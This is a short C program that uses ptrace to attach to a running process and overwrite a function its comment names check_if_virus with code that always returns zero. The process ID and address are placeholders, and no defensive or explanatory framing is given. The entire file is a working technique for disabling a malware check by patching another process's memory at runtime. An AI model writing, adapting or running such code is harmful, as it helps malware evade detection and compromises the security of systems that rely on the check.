#include <assert.h>
#include <stdint.h>
#include <stdio.h>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

int pid = 0x12345678;
int address = 0x87654321;

int main() {

    // Attach to the process
    if(ptrace(PTRACE_ATTACH, pid, NULL, NULL) == -1){
        perror("attach");
        return -1;
    }

    int status;
    // Wait for the process to stop
    waitpid(pid, &status, 0);

    // Abort if the process exits
    if(WIFEXITED(status)){
        return 0;
    }

    // Overrite check_if_virus

    // mov eax, 0x0; RET
    long data1 = 0x000000b8;
    long data2 = 0xc300;

    if(ptrace(PTRACE_POKETEXT, pid, (void*)address, (void*)data1) == -1){
        perror("poke_text");
        return -1;
    }

    if(ptrace(PTRACE_POKETEXT, pid, (void*)address + sizeof(long), (void*)data2) == -1){
        perror("poke_text");
        return -1;
    }

    // Detach when done
    if(ptrace(PTRACE_DETACH, pid, NULL, NULL) == -1){
        perror("detach");
        return -1;
    }

    return 0;
}
